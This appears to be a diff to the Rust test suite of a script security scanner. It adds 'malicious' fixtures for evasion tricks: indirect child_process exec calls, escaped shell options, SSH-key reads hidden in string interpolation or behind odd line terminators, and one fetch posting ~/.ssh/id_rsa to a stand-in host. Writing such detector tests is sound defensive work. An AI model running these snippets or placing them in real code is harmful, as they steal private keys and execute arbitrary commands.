@@ -261,6 +261,138 @@ fn malicious() -> Vec<Malicious> {
             rule: EXEC_RULE,
             floor: Severity::Critical,
         },
+        // Round 3, P0-A: indirect call forms after a module binding.
+        Malicious {
+            name: "bracket call",
+            path: "scripts/r3a1.js",
+            body: "const cp = require('child_process');\ncp['exec'](process.argv[2]);\n"
+                .to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "optional-chain call",
+            path: "scripts/r3a2.js",
+            body: "const cp = require('child_process');\ncp?.exec?.(process.argv[2]);\n".to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "extracted call reference",
+            path: "scripts/r3a3.js",
+            body: "const cp = require('child_process');\nconst run = cp.exec;\nrun(process.argv[2]);\n"
+                .to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "second unresolved binding on one line",
+            path: "scripts/r3a4.js",
+            body: "const cp=require('child_process'); global.other=require('child_process');\nother['exec'](input);\n"
+                .to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        // Round 3, P0-B: module mention in non-straight-quote syntax.
+        Malicious {
+            name: "backtick require",
+            path: "scripts/r3b1.js",
+            body: "const cp = require(`child_process`);\ncp.exec(process.argv[2]);\n".to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "createRequire module mention",
+            path: "scripts/r3b2.js",
+            body: "const req = require('module').createRequire(__filename);\nconst cp = req('child_process');\ncp.exec(process.argv[2]);\n"
+                .to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        // Round 3, P0-C: duplicate, escaped, and string-hidden shell options.
+        Malicious {
+            name: "duplicate shell keys last wins",
+            path: "scripts/r3c1.js",
+            body: "spawn('echo', ['$X'], {shell:false,shell:true});\n".to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "escaped shell key",
+            path: "scripts/r3c2.js",
+            body: r#"spawn('echo', ['$X'], {'sh\u0065ll':true});"#.to_string() + "\n",
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "shell text inside another option",
+            path: "scripts/r3c3.js",
+            body: "spawn('echo', ['$X'], {cwd:'shell:false,',shell:true});\n".to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "fixed call plus hidden dynamic call",
+            path: "scripts/r3c4.js",
+            body: "const cp=require('child_process'); execSync('ls'); cp['exec'](input);\n"
+                .to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
+        // Round 3, P0-D: executable multiline/embedded content.
+        Malicious {
+            name: "template interpolation read",
+            path: "scripts/r3d1.js",
+            body: "const x = `\n// Never read ${require('fs').readFileSync('/home/me/.ssh/id_rsa')}\n`; fetch('https://evil.test',{method:'POST',body:x});\n"
+                .to_string(),
+            rule: CREDENTIAL_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "shell command substitution",
+            path: "scripts/r3d2.sh",
+            body: "echo \"\n# Never read $(cat ~/.ssh/id_rsa)\n\"\n".to_string(),
+            rule: CREDENTIAL_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "ruby interpolation",
+            path: "scripts/r3d3.rb",
+            body: "x = \"\n# Never read #{File.read('/home/me/.ssh/id_rsa')}\n\"\n".to_string(),
+            rule: CREDENTIAL_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "php inside an html comment",
+            path: "scripts/r3d4.php",
+            body: "<!-- Never read ~/.ssh/id_rsa -->\n<?php echo file_get_contents('/home/me/.ssh/id_rsa'); ?>\n"
+                .to_string(),
+            rule: CREDENTIAL_RULE,
+            floor: Severity::Critical,
+        },
+        // Round 3, P0-E: non-LF line terminators.
+        Malicious {
+            name: "u2028 after a line comment",
+            path: "scripts/r3e1.js",
+            body: "// Never read \u{2028}fs.readFileSync('/home/me/.ssh/id_rsa');\n".to_string(),
+            rule: CREDENTIAL_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "carriage return after a line comment",
+            path: "scripts/r3e2.js",
+            body: "// Never read \r fs.readFileSync('/home/me/.ssh/id_rsa');\n".to_string(),
+            rule: CREDENTIAL_RULE,
+            floor: Severity::Critical,
+        },
+        Malicious {
+            name: "u2029 before an alias call",
+            path: "scripts/r3e3.js",
+            body: "const cp = require('child_process');\n// Never read \u{2029}cp.exec(process.argv[2]);\n"
+                .to_string(),
+            rule: EXEC_RULE,
+            floor: Severity::Critical,
+        },
     ]
 }
 
@@ -292,53 +424,42 @@ fn no_malicious_probe_scores_below_the_base_revision() {
     }
 }
 
-/// A named benign fixture: the rule may be downgraded, but never to a
-/// critical/high severity, and it may attest a pass.
-struct Benign {
+/// Formerly benign fixtures. The severity downgrades were removed after
+/// review, so these are known false positives that must still meet the base
+/// revision's floor; a parser-based follow-up owns making them benign.
+struct KnownFalsePositive {
     name: &'static str,
     path: &'static str,
     body: &'static str,
     rule: &'static str,
-    ceiling: Severity,
 }
 
 #[test]
-fn named_benign_fixtures_stay_at_the_agreed_policy_severity() {
+fn known_false_positives_still_meet_the_base_revision_floor() {
     let cases = [
-        Benign {
+        KnownFalsePositive {
             name: "defensive comment",
             path: "scripts/b1.py",
             body: "# Never read ~/.ssh/id_rsa\n",
             rule: CREDENTIAL_RULE,
-            ceiling: Severity::Low,
         },
-        Benign {
-            name: "import with no call",
-            path: "scripts/b2.py",
-            body: "import subprocess\n",
-            rule: EXEC_RULE,
-            ceiling: Severity::Info,
-        },
-        Benign {
+        KnownFalsePositive {
             name: "fixed literal call",
             path: "scripts/b3.js",
             body: "execSync(\"ls -la\");\n",
             rule: EXEC_RULE,
-            ceiling: Severity::Low,
         },
-        Benign {
+        KnownFalsePositive {
             name: "fixed literal call with literal options",
             path: "scripts/b4.js",
             body: "execFile(\"ls\", [\"-la\"], {cwd: \"/tmp\"});\n",
             rule: EXEC_RULE,
-            ceiling: Severity::Low,
         },
-        Benign {
+        KnownFalsePositive {
             name: "module import only",
             path: "scripts/b5.js",
             body: "const cp = require('child_process');\n",
             rule: EXEC_RULE,
-            ceiling: Severity::Info,
         },
     ];
     for case in cases {
@@ -346,30 +467,34 @@ fn named_benign_fixtures_stay_at_the_agreed_policy_severity() {
         let severity = highest(&result, case.rule)
             .unwrap_or_else(|| panic!("{}: expected a {} finding", case.name, case.rule));
         assert!(
-            severity <= case.ceiling,
-            "{}: {} is {:?}, above the agreed benign ceiling {:?}",
+            severity >= Severity::Critical,
+            "{}: {} is {:?}, below the base revision floor",
             case.name,
             case.rule,
-            severity,
-            case.ceiling
+            severity
+        );
+        assert!(
+            !attests_secrets_pass(&result),
+            "{}: a critical finding must not coexist with a secrets-pass attestation",
+            case.name
         );
     }
 }
 
 #[test]
-fn a_defensive_comment_and_a_network_sink_do_not_contradict_the_attestation() {
+fn a_defensive_comment_and_a_network_sink_match_the_base_revision() {
+    // Known false positive: origin/main treats the credential label as a
+    // source, so this comment plus a sink still chains. The downgrades that
+    // suppressed this were removed.
     let result = scan(
         "scripts/c1.py",
         "# Never read ~/.ssh/id_rsa\nrequests.post(\"https://collector.test\", data=\"x\")\n",
     );
-    assert_eq!(highest(&result, CREDENTIAL_RULE), Some(Severity::Low));
+    assert_eq!(highest(&result, CREDENTIAL_RULE), Some(Severity::Critical));
+    assert_eq!(highest(&result, CHAIN_RULE), Some(Severity::Critical));
     assert!(
-        findings_for(&result, CHAIN_RULE).is_empty(),
-        "a defensive reference must not become a chain source"
-    );
-    assert!(
-        attests_secrets_pass(&result),
-        "no actionable secret remains, so the pass attestation is consistent"
+        !attests_secrets_pass(&result),
+        "a critical chain must not coexist with a secrets-pass attestation"
     );
 }
 
